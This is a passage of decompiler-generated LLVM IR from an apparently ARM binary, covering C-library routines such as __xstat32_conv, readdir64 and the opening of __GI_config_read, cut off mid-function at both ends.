  store i32 %v5_1663c, i32* %r4.global-to-local, align 4
  %v1_16640 = add i32 %v0_16638, 56
  %v2_16640 = inttoptr i32 %v1_16640 to i32*
  %v3_16640 = load i32, i32* %v2_16640, align 4
  store i32 %v3_16640, i32* %r2.global-to-local, align 4
  %v1_16644 = load i32, i32* %r5.global-to-local, align 4
  %v2_16644 = add i32 %v1_16644, 96
  %v3_16644 = inttoptr i32 %v2_16644 to i32*
  store i32 %v2_1663c, i32* %v3_16644, align 4
  %v0_16648 = load i32, i32* %r4.global-to-local, align 4
  %v1_16648 = load i32, i32* %r5.global-to-local, align 4
  %v2_16648 = add i32 %v1_16648, 100
  %v3_16648 = inttoptr i32 %v2_16648 to i32*
  store i32 %v0_16648, i32* %v3_16648, align 4
  %v0_1664c = load i32, i32* %r6.global-to-local, align 4
  %v1_1664c = add i32 %v0_1664c, 24
  store i32 %v1_1664c, i32* %ip.global-to-local, align 4
  %v1_16650 = inttoptr i32 %v1_1664c to i32*
  %v2_16650 = load i32, i32* %v1_16650, align 4
  store i32 %v2_16650, i32* %ip.global-to-local, align 4
  %v3_16650 = add i32 %v0_1664c, 28
  %v4_16650 = inttoptr i32 %v3_16650 to i32*
  %v5_16650 = load i32, i32* %v4_16650, align 4
  store i32 %v5_16650, i32* %lr.global-to-local, align 4
  %v0_16654 = load i32, i32* %r2.global-to-local, align 4
  %v1_16654 = load i32, i32* %r5.global-to-local, align 4
  %v2_16654 = add i32 %v1_16654, 56
  %v3_16654 = inttoptr i32 %v2_16654 to i32*
  store i32 %v0_16654, i32* %v3_16654, align 4
  %v0_16658 = load i32, i32* %r6.global-to-local, align 4
  %v1_16658 = add i32 %v0_16658, 72
  store i32 %v1_16658, i32* %r3.global-to-local, align 4
  %v1_1665c = add i32 %v0_16658, 32
  store i32 %v1_1665c, i32* %r7.global-to-local, align 4
  %v1_16660 = inttoptr i32 %v1_1665c to i32*
  %v2_16660 = load i32, i32* %v1_16660, align 4
  store i32 %v2_16660, i32* %r7.global-to-local, align 4
  %v3_16660 = add i32 %v0_16658, 36
  %v4_16660 = inttoptr i32 %v3_16660 to i32*
  %v5_16660 = load i32, i32* %v4_16660, align 4
  store i32 %v5_16660, i32* %r8.global-to-local, align 4
  %v1_16664 = inttoptr i32 %v1_16658 to i32*
  %v2_16664 = load i32, i32* %v1_16664, align 4
  %v3_16664 = add i32 %v0_16658, 76
  %v4_16664 = inttoptr i32 %v3_16664 to i32*
  %v5_16664 = load i32, i32* %v4_16664, align 4
  store i32 %v5_16664, i32* %r1.global-to-local, align 4
  %v0_16668 = load i32, i32* %r5.global-to-local, align 4
  %v1_16668 = add i32 %v0_16668, 72
  %v1_1666c = inttoptr i32 %v1_16668 to i32*
  store i32 %v2_16664, i32* %v1_1666c, align 4
  %v3_1666c = add i32 %v0_16668, 76
  %v4_1666c = inttoptr i32 %v3_1666c to i32*
  %v5_1666c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1666c, i32* %v4_1666c, align 4
  %v0_16670 = load i32, i32* %r7.global-to-local, align 4
  %v1_16670 = load i32, i32* %r5.global-to-local, align 4
  %v2_16670 = add i32 %v1_16670, 32
  %v3_16670 = inttoptr i32 %v2_16670 to i32*
  store i32 %v0_16670, i32* %v3_16670, align 4
  %v0_16674 = load i32, i32* %r8.global-to-local, align 4
  %v1_16674 = load i32, i32* %r5.global-to-local, align 4
  %v2_16674 = add i32 %v1_16674, 36
  %v3_16674 = inttoptr i32 %v2_16674 to i32*
  store i32 %v0_16674, i32* %v3_16674, align 4
  %v0_16678 = load i32, i32* %r6.global-to-local, align 4
  %v1_16678 = add i32 %v0_16678, 80
  store i32 %v1_16678, i32* %r3.global-to-local, align 4
  %v1_1667c = add i32 %v0_16678, 48
  store i32 %v1_1667c, i32* %r7.global-to-local, align 4
  %v1_16680 = inttoptr i32 %v1_1667c to i32*
  %v2_16680 = load i32, i32* %v1_16680, align 4
  store i32 %v2_16680, i32* %r7.global-to-local, align 4
  %v3_16680 = add i32 %v0_16678, 52
  %v4_16680 = inttoptr i32 %v3_16680 to i32*
  %v5_16680 = load i32, i32* %v4_16680, align 4
  store i32 %v5_16680, i32* %r8.global-to-local, align 4
  %v1_16684 = inttoptr i32 %v1_16678 to i32*
  %v2_16684 = load i32, i32* %v1_16684, align 4
  %v3_16684 = add i32 %v0_16678, 84
  %v4_16684 = inttoptr i32 %v3_16684 to i32*
  %v5_16684 = load i32, i32* %v4_16684, align 4
  store i32 %v5_16684, i32* %r1.global-to-local, align 4
  %v1_16688 = add i32 %v0_16678, 16
  %v2_16688 = inttoptr i32 %v1_16688 to i32*
  %v3_16688 = load i32, i32* %v2_16688, align 4
  store i32 %v3_16688, i32* %r2.global-to-local, align 4
  %v0_1668c = load i32, i32* %r5.global-to-local, align 4
  %v1_1668c = add i32 %v0_1668c, 80
  %v1_16690 = inttoptr i32 %v1_1668c to i32*
  store i32 %v2_16684, i32* %v1_16690, align 4
  %v3_16690 = add i32 %v0_1668c, 84
  %v4_16690 = inttoptr i32 %v3_16690 to i32*
  %v5_16690 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16690, i32* %v4_16690, align 4
  %v0_16694 = load i32, i32* %r7.global-to-local, align 4
  %v1_16694 = load i32, i32* %r5.global-to-local, align 4
  %v2_16694 = add i32 %v1_16694, 48
  %v3_16694 = inttoptr i32 %v2_16694 to i32*
  store i32 %v0_16694, i32* %v3_16694, align 4
  %v0_16698 = load i32, i32* %r8.global-to-local, align 4
  %v1_16698 = load i32, i32* %r5.global-to-local, align 4
  %v2_16698 = add i32 %v1_16698, 52
  %v3_16698 = inttoptr i32 %v2_16698 to i32*
  store i32 %v0_16698, i32* %v3_16698, align 4
  %v0_1669c = load i32, i32* %r2.global-to-local, align 4
  %v1_1669c = load i32, i32* %r5.global-to-local, align 4
  %v2_1669c = add i32 %v1_1669c, 16
  %v3_1669c = inttoptr i32 %v2_1669c to i32*
  store i32 %v0_1669c, i32* %v3_1669c, align 4
  %v0_166a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_166a0 = add i32 %v0_166a0, 88
  store i32 %v1_166a0, i32* %r3.global-to-local, align 4
  %v1_166a4 = add i32 %v0_166a0, 20
  %v2_166a4 = inttoptr i32 %v1_166a4 to i32*
  %v3_166a4 = load i32, i32* %v2_166a4, align 4
  store i32 %v3_166a4, i32* %r2.global-to-local, align 4
  %v1_166a8 = inttoptr i32 %v1_166a0 to i32*
  %v2_166a8 = load i32, i32* %v1_166a8, align 4
  %v3_166a8 = add i32 %v0_166a0, 92
  %v4_166a8 = inttoptr i32 %v3_166a8 to i32*
  %v5_166a8 = load i32, i32* %v4_166a8, align 4
  store i32 %v5_166a8, i32* %r1.global-to-local, align 4
  %v1_166ac = add i32 %v0_166a0, 64
  store i32 %v1_166ac, i32* %r6.global-to-local, align 4
  %v1_166b0 = inttoptr i32 %v1_166ac to i32*
  %v2_166b0 = load i32, i32* %v1_166b0, align 4
  store i32 %v2_166b0, i32* %r6.global-to-local, align 4
  %v3_166b0 = add i32 %v0_166a0, 68
  %v4_166b0 = inttoptr i32 %v3_166b0 to i32*
  %v5_166b0 = load i32, i32* %v4_166b0, align 4
  store i32 %v5_166b0, i32* %r7.global-to-local, align 4
  %v0_166b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166b4 = add i32 %v0_166b4, 88
  store i32 %v1_166b4, i32* %r3.global-to-local, align 4
  %v2_166b8 = add i32 %v0_166b4, 20
  %v3_166b8 = inttoptr i32 %v2_166b8 to i32*
  store i32 %v3_166a4, i32* %v3_166b8, align 4
  %v0_166bc = load i32, i32* %ip.global-to-local, align 4
  %v1_166bc = load i32, i32* %r5.global-to-local, align 4
  %v2_166bc = add i32 %v1_166bc, 24
  %v3_166bc = inttoptr i32 %v2_166bc to i32*
  store i32 %v0_166bc, i32* %v3_166bc, align 4
  %v0_166c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_166c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_166c0 = add i32 %v1_166c0, 28
  %v3_166c0 = inttoptr i32 %v2_166c0 to i32*
  store i32 %v0_166c0, i32* %v3_166c0, align 4
  %v0_166c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_166c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166c4 = add i32 %v1_166c4, 64
  %v3_166c4 = inttoptr i32 %v2_166c4 to i32*
  store i32 %v0_166c4, i32* %v3_166c4, align 4
  %v0_166c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_166c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_166c8 = add i32 %v1_166c8, 68
  %v3_166c8 = inttoptr i32 %v2_166c8 to i32*
  store i32 %v0_166c8, i32* %v3_166c8, align 4
  %v0_166cc = load i32, i32* %r3.global-to-local, align 4
  %v1_166cc = inttoptr i32 %v0_166cc to i32*
  store i32 %v2_166a8, i32* %v1_166cc, align 4
  %v3_166cc = add i32 %v0_166cc, 4
  %v4_166cc = inttoptr i32 %v3_166cc to i32*
  %v5_166cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_166cc, i32* %v4_166cc, align 4
  %v2_166d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_166d0, i32* %r4.global-to-local, align 4
  ret i32 %v2_166a8

; uselistorder directives
  uselistorder i32 %v0_166a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16678, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_166d8 = load i32, i32* @r4, align 4
  store i32 %v3_166d8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_166f0 = inttoptr i32 %arg2 to i8*
  %v4_166f0 = call i32 @__GI_memset(i8* %v3_166f0, i32 0, i32 88)
  %v2_166f4 = load i32, i32* %arg1, align 4
  %v3_166f4 = add i32 %tmp, 4
  %v4_166f4 = inttoptr i32 %v3_166f4 to i32*
  %v5_166f4 = load i32, i32* %v4_166f4, align 4
  store i32 %v5_166f4, i32* %r4.global-to-local, align 4
  %v0_166f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_166f8 = inttoptr i32 %v0_166f8 to i32*
  store i32 %v2_166f4, i32* %v1_166f8, align 4
  %v3_166f8 = add i32 %v0_166f8, 4
  %v4_166f8 = inttoptr i32 %v3_166f8 to i32*
  %v5_166f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_166f8, i32* %v4_166f8, align 4
  %v0_166fc = load i32, i32* %r5.global-to-local, align 4
  %v1_166fc = add i32 %v0_166fc, 32
  %v1_16700 = inttoptr i32 %v1_166fc to i32*
  %v2_16700 = load i32, i32* %v1_16700, align 4
  %v3_16700 = add i32 %v0_166fc, 36
  %v4_16700 = inttoptr i32 %v3_16700 to i32*
  %v5_16700 = load i32, i32* %v4_16700, align 4
  store i32 %v5_16700, i32* %r4.global-to-local, align 4
  %v1_16704 = add i32 %v0_166fc, 96
  %v2_16704 = inttoptr i32 %v1_16704 to i32*
  %v3_16704 = load i32, i32* %v2_16704, align 4
  store i32 %v3_16704, i32* %r2.global-to-local, align 4
  %v1_16708 = load i32, i32* %r6.global-to-local, align 4
  %v2_16708 = add i32 %v1_16708, 32
  %v3_16708 = inttoptr i32 %v2_16708 to i32*
  store i32 %v2_16700, i32* %v3_16708, align 4
  %v0_1670c = load i32, i32* %r4.global-to-local, align 4
  %v1_1670c = load i32, i32* %r6.global-to-local, align 4
  %v2_1670c = add i32 %v1_1670c, 36
  %v3_1670c = inttoptr i32 %v2_1670c to i32*
  store i32 %v0_1670c, i32* %v3_1670c, align 4
  %v0_16710 = load i32, i32* %r2.global-to-local, align 4
  %v1_16710 = load i32, i32* %r6.global-to-local, align 4
  %v2_16710 = add i32 %v1_16710, 12
  %v3_16710 = inttoptr i32 %v2_16710 to i32*
  store i32 %v0_16710, i32* %v3_16710, align 4
  %v0_16714 = load i32, i32* %r5.global-to-local, align 4
  %v1_16714 = add i32 %v0_16714, 48
  %v2_16714 = inttoptr i32 %v1_16714 to i32*
  %v3_16714 = load i32, i32* %v2_16714, align 4
  %v1_16718 = add i32 %v0_16714, 24
  store i32 %v1_16718, i32* %ip.global-to-local, align 4
  %v1_1671c = inttoptr i32 %v1_16718 to i32*
  %v2_1671c = load i32, i32* %v1_1671c, align 4
  store i32 %v2_1671c, i32* %ip.global-to-local, align 4
  %v3_1671c = add i32 %v0_16714, 28
  %v4_1671c = inttoptr i32 %v3_1671c to i32*
  %v5_1671c = load i32, i32* %v4_1671c, align 4
  store i32 %v5_1671c, i32* %lr.global-to-local, align 4
  %v1_16720 = load i32, i32* %r6.global-to-local, align 4
  %v2_16720 = add i32 %v1_16720, 44
  %v3_16720 = inttoptr i32 %v2_16720 to i32*
  store i32 %v3_16714, i32* %v3_16720, align 4
  %v0_16724 = load i32, i32* %r5.global-to-local, align 4
  %v1_16724 = add i32 %v0_16724, 64
  %v2_16724 = inttoptr i32 %v1_16724 to i32*
  %v3_16724 = load i32, i32* %v2_16724, align 4
  %v1_16728 = add i32 %v0_16724, 56
  %v2_16728 = inttoptr i32 %v1_16728 to i32*
  %v3_16728 = load i32, i32* %v2_16728, align 4
  store i32 %v3_16728, i32* %r2.global-to-local, align 4
  %v1_1672c = load i32, i32* %r6.global-to-local, align 4
  %v2_1672c = add i32 %v1_1672c, 52
  %v3_1672c = inttoptr i32 %v2_1672c to i32*
  store i32 %v3_16724, i32* %v3_1672c, align 4
  %v0_16730 = load i32, i32* %r2.global-to-local, align 4
  %v1_16730 = load i32, i32* %r6.global-to-local, align 4
  %v2_16730 = add i32 %v1_16730, 48
  %v3_16730 = inttoptr i32 %v2_16730 to i32*
  store i32 %v0_16730, i32* %v3_16730, align 4
  %v0_16734 = load i32, i32* %r5.global-to-local, align 4
  %v1_16734 = add i32 %v0_16734, 72
  %v1_16738 = inttoptr i32 %v1_16734 to i32*
  %v2_16738 = load i32, i32* %v1_16738, align 4
  %v3_16738 = add i32 %v0_16734, 76
  %v4_16738 = inttoptr i32 %v3_16738 to i32*
  %v5_16738 = load i32, i32* %v4_16738, align 4
  store i32 %v5_16738, i32* %r1.global-to-local, align 4
  %v0_1673c = load i32, i32* %r6.global-to-local, align 4
  %v1_1673c = add i32 %v0_1673c, 56
  %v1_16740 = inttoptr i32 %v1_1673c to i32*
  store i32 %v2_16738, i32* %v1_16740, align 4
  %v3_16740 = add i32 %v0_1673c, 60
  %v4_16740 = inttoptr i32 %v3_16740 to i32*
  %v5_16740 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16740, i32* %v4_16740, align 4
  %v0_16744 = load i32, i32* %r5.global-to-local, align 4
  %v1_16744 = add i32 %v0_16744, 80
  %v1_16748 = inttoptr i32 %v1_16744 to i32*
  %v2_16748 = load i32, i32* %v1_16748, align 4
  %v3_16748 = add i32 %v0_16744, 84
  %v4_16748 = inttoptr i32 %v3_16748 to i32*
  %v5_16748 = load i32, i32* %v4_16748, align 4
  store i32 %v5_16748, i32* %r1.global-to-local, align 4
  %v0_1674c = load i32, i32* %r6.global-to-local, align 4
  %v1_1674c = add i32 %v0_1674c, 64
  %v1_16750 = inttoptr i32 %v1_1674c to i32*
  store i32 %v2_16748, i32* %v1_16750, align 4
  %v3_16750 = add i32 %v0_1674c, 68
  %v4_16750 = inttoptr i32 %v3_16750 to i32*
  %v5_16750 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16750, i32* %v4_16750, align 4
  %v0_16754 = load i32, i32* %r5.global-to-local, align 4
  %v1_16754 = add i32 %v0_16754, 16
  %v2_16754 = inttoptr i32 %v1_16754 to i32*
  %v3_16754 = load i32, i32* %v2_16754, align 4
  %v1_16758 = load i32, i32* %r6.global-to-local, align 4
  %v2_16758 = add i32 %v1_16758, 16
  %v3_16758 = inttoptr i32 %v2_16758 to i32*
  store i32 %v3_16754, i32* %v3_16758, align 4
  %v0_1675c = load i32, i32* %r5.global-to-local, align 4
  %v1_1675c = add i32 %v0_1675c, 88
  %v1_16760 = add i32 %v0_1675c, 20
  %v2_16760 = inttoptr i32 %v1_16760 to i32*
  %v3_16760 = load i32, i32* %v2_16760, align 4
  store i32 %v3_16760, i32* %r2.global-to-local, align 4
  %v1_16764 = inttoptr i32 %v1_1675c to i32*
  %v2_16764 = load i32, i32* %v1_16764, align 4
  %v3_16764 = add i32 %v0_1675c, 92
  %v4_16764 = inttoptr i32 %v3_16764 to i32*
  %v5_16764 = load i32, i32* %v4_16764, align 4
  store i32 %v5_16764, i32* %r1.global-to-local, align 4
  %v0_16768 = load i32, i32* %r6.global-to-local, align 4
  %v1_16768 = add i32 %v0_16768, 72
  %v1_1676c = inttoptr i32 %v1_16768 to i32*
  store i32 %v2_16764, i32* %v1_1676c, align 4
  %v3_1676c = add i32 %v0_16768, 76
  %v4_1676c = inttoptr i32 %v3_1676c to i32*
  %v5_1676c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1676c, i32* %v4_1676c, align 4
  %v0_16770 = load i32, i32* %r2.global-to-local, align 4
  %v1_16770 = load i32, i32* %r6.global-to-local, align 4
  %v2_16770 = add i32 %v1_16770, 20
  %v3_16770 = inttoptr i32 %v2_16770 to i32*
  store i32 %v0_16770, i32* %v3_16770, align 4
  %v0_16774 = load i32, i32* %ip.global-to-local, align 4
  %v1_16774 = load i32, i32* %r6.global-to-local, align 4
  %v2_16774 = add i32 %v1_16774, 24
  %v3_16774 = inttoptr i32 %v2_16774 to i32*
  store i32 %v0_16774, i32* %v3_16774, align 4
  %v0_16778 = load i32, i32* %lr.global-to-local, align 4
  %v1_16778 = load i32, i32* %r6.global-to-local, align 4
  %v2_16778 = add i32 %v1_16778, 28
  %v3_16778 = inttoptr i32 %v2_16778 to i32*
  store i32 %v0_16778, i32* %v3_16778, align 4
  %v2_1677c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1677c, i32* %r4.global-to-local, align 4
  ret i32 %v2_16764

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 7, 3, 4, 1, 2, 0, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r6, align 4
  %v1_16798 = add i32 %tmp, 24
  store i32 %v1_16798, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_167b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  store i32 %v4_167b0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_167b0)
  %v0_167c4 = load i32, i32* @r6, align 4
  %v2_167c4 = add i32 %v0_167c4, 16
  %v3_167c4 = inttoptr i32 %v2_167c4 to i32*
  %v4_167c4 = load i32, i32* %v3_167c4, align 4
  store i32 %v4_167c4, i32* %ip.global-to-local, align 4
  store i32 92112, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_167c4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_167d4

dec_label_pc_167d4:                               ; preds = %dec_label_pc_16804, %entry
  %v0_167d4 = load i32, i32* @r5, align 4
  %v1_167d4 = add i32 %v0_167d4, 4
  %v2_167d4 = inttoptr i32 %v1_167d4 to i32*
  %v3_167d4 = load i32, i32* %v2_167d4, align 4
  %v4_167d4 = add i32 %v0_167d4, 8
  %v5_167d4 = inttoptr i32 %v4_167d4 to i32*
  %v6_167d4 = load i32, i32* %v5_167d4, align 4
  %tmp10 = icmp ugt i32 %v6_167d4, %v3_167d4
  br i1 %tmp10, label %dec_label_pc_16804, label %dec_label_pc_167e0

dec_label_pc_167e0:                               ; preds = %dec_label_pc_167d4
  %v1_167e0 = inttoptr i32 %v0_167d4 to i32*
  %v2_167e0 = load i32, i32* %v1_167e0, align 4
  %v1_167e4 = add i32 %v0_167d4, 12
  %v2_167e4 = inttoptr i32 %v1_167e4 to i32*
  %v3_167e4 = load i32, i32* %v2_167e4, align 4
  %v1_167e8 = add i32 %v0_167d4, 20
  %v2_167e8 = inttoptr i32 %v1_167e8 to i32*
  %v3_167e8 = load i32, i32* %v2_167e8, align 4
  %v4_167ec = inttoptr i32 %v3_167e4 to i32*
  %v5_167ec = call i32 @__getdents64(i32 %v2_167e0, i32* %v4_167ec, i32 %v3_167e8, i32 %v6_167d4)
  %tmp9 = icmp slt i32 %v5_167ec, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_167fc

.thread:                                          ; preds = %dec_label_pc_167e0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16834

dec_label_pc_167fc:                               ; preds = %dec_label_pc_167e0
  %v1_167fc = load i32, i32* @r5, align 4
  %v2_167fc = add i32 %v1_167fc, 8
  %v3_167fc = inttoptr i32 %v2_167fc to i32*
  store i32 %v5_167ec, i32* %v3_167fc, align 4
  %v0_16800 = load i32, i32* @r7, align 4
  %v1_16800 = load i32, i32* @r5, align 4
  %v2_16800 = add i32 %v1_16800, 4
  %v3_16800 = inttoptr i32 %v2_16800 to i32*
  store i32 %v0_16800, i32* %v3_16800, align 4
  %v0_16804.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %dec_label_pc_167d4, %dec_label_pc_167fc
  %v1_16828 = phi i32 [ %v0_167d4, %dec_label_pc_167d4 ], [ %v0_16804.pre, %dec_label_pc_167fc ]
  %v1_16804 = add i32 %v1_16828, 4
  %v2_16804 = inttoptr i32 %v1_16804 to i32*
  %v3_16804 = load i32, i32* %v2_16804, align 4
  %v1_16808 = add i32 %v1_16828, 12
  %v2_16808 = inttoptr i32 %v1_16808 to i32*
  %v3_16808 = load i32, i32* %v2_16808, align 4
  %v2_1680c = add i32 %v3_16808, %v3_16804
  store i32 %v2_1680c, i32* @r4, align 4
  %v3_16810 = inttoptr i32 %v2_1680c to i32*
  %v4_16810 = load i32, i32* %v3_16810, align 4
  %v1_16814 = add i32 %v2_1680c, 4
  %v2_16814 = inttoptr i32 %v1_16814 to i32*
  %v3_16814 = load i32, i32* %v2_16814, align 4
  %v1_16818 = add i32 %v2_1680c, 16
  %v2_16818 = inttoptr i32 %v1_16818 to i16*
  %v3_16818 = load i16, i16* %v2_16818, align 2
  %v4_16818 = zext i16 %v3_16818 to i32
  %v1_1681c = add i32 %v2_1680c, 8
  %v2_1681c = inttoptr i32 %v1_1681c to i32*
  %v3_1681c = load i32, i32* %v2_1681c, align 4
  store i32 %v3_1681c, i32* %ip.global-to-local, align 4
  %v2_16820 = add i32 %v4_16818, %v3_16804
  %v2_16824 = or i32 %v3_16814, %v4_16810
  %v4_16824 = icmp eq i32 %v2_16824, 0
  store i32 %v2_16820, i32* %v2_16804, align 4
  %v0_1682c = load i32, i32* %ip.global-to-local, align 4
  %v1_1682c = load i32, i32* @r5, align 4
  %v2_1682c = add i32 %v1_1682c, 16
  %v3_1682c = inttoptr i32 %v2_1682c to i32*
  store i32 %v0_1682c, i32* %v3_1682c, align 4
  br i1 %v4_16824, label %dec_label_pc_167d4, label %dec_label_pc_16834

dec_label_pc_16834:                               ; preds = %dec_label_pc_16804, %.thread
  %v0_16840 = load i32, i32* @r6, align 4
  %v2_16840 = add i32 %v0_16840, 44
  %v3_16840 = inttoptr i32 %v2_16840 to i32*
  %v4_16840 = load i32, i32* %v3_16840, align 4
  store i32 %v4_16840, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16840)
  %v0_1684c = load i32, i32* @r4, align 4
  ret i32 %v0_1684c

; uselistorder directives
  uselistorder i32 %v2_1680c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_16828, { 1, 0 }
  uselistorder i32 %v6_167d4, { 1, 0 }
  uselistorder i32 %v0_167d4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_16804, { 1, 0 }
}

define i32 @function_16860(i32 %arg1) local_unnamed_addr {
dec_label_pc_16860:
  %v0_16860 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16860, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16860
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16860, %bb
  %v4_1686c = phi i32 [ %arg1, %dec_label_pc_16860 ], [ 0, %bb ]
  ret i32 %v4_1686c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_16870 = load i32, i32* @r4, align 4
  %v6_16870 = load i32, i32* @r5, align 4
  %v9_16870 = load i32, i32* @r6, align 4
  %v12_16870 = load i32, i32* @r7, align 4
  %v15_16870 = load i32, i32* @r8, align 4
  %v18_16870 = load i32, i32* @sb, align 4
  %v21_16870 = load i32, i32* @sl, align 4
  %v24_16870 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_16874 = icmp eq i32* %arg1, null
  store i1 %v2_16874, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_16874, label %dec_label_pc_16b84, label %dec_label_pc_1688c

dec_label_pc_1688c:                               ; preds = %entry
  %v1_1688c = urem i32 %arg3, 256
  store i32 %v1_1688c, i32* @sb, align 4
  %v1_16890 = and i32 %arg3, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v3_16894 = udiv i32 %v1_16890, 256
  %v3_16898 = mul nuw nsw i32 %v1_1688c, 4
  %v1_168a0 = or i32 %v3_16898, 1
  %v1_168ac = and i32 %arg3, 131072
  %v1_168b0 = add nsw i32 %v1_1688c, -1
  %v1_168bc = and i32 %arg3, 262144
  store i32 %v1_168bc, i32* %r2.global-to-local, align 4
  %v1_168c0 = and i32 %arg3, 65536
  store i32 %v1_168c0, i32* %r3.global-to-local, align 4
  store i32 %v1_168c0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_168d0 = add i32 %arg4, 1
  store i32 %v1_168d0, i32* @sl, align 4
  %v2_16a48 = icmp eq i32 %v1_168ac, 0
  %v1_16aa0 = inttoptr i32 %arg2 to i32*
  %v2_16ab8 = icmp eq i32 %v1_168bc, 0
  br label %dec_label_pc_168d4

dec_label_pc_168d4:                               ; preds = %dec_label_pc_168d4.backedge, %dec_label_pc_1688c
  %v2_168f0 = phi i32 [ %v0_168d4.pre, %dec_label_pc_168d4.backedge ], [ %tmp, %dec_label_pc_1688c ]
  %v1_168d4 = add i32 %v2_168f0, 4
  %v2_168d4 = inttoptr i32 %v1_168d4 to i32*
  %v3_168d4 = load i32, i32* %v2_168d4, align 4
  store i32 %v3_168d4, i32* %r3.global-to-local, align 4
  %v2_168d8 = icmp eq i32 %v3_168d4, 0
  store i1 %v2_168d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168d8, label %dec_label_pc_168e0, label %dec_label_pc_16928

dec_label_pc_168e0:                               ; preds = %dec_label_pc_168d4
  %v1_168e0 = add i32 %v2_168f0, 16
  %v2_168e0 = inttoptr i32 %v1_168e0 to i32*
  %v3_168e0 = load i32, i32* %v2_168e0, align 4
  store i32 %v3_168e0, i32* %r3.global-to-local, align 4
  %v2_168e4 = icmp eq i32 %v3_168e0, 0
  store i1 %v2_168e4, i1* %cpsr_z.global-to-local, align 1
  %v1_168e8 = add i32 %v2_168f0, 8
  %v2_168e8 = inttoptr i32 %v1_168e8 to i32*
  %v3_168e8 = load i32, i32* %v2_168e8, align 4
  store i32 %v3_168e8, i32* %r3.global-to-local, align 4
  br i1 %v2_168e4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_168e0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_168e0, align 4
  %v0_168f4.pre = load i32, i32* %r3.global-to-local, align 4
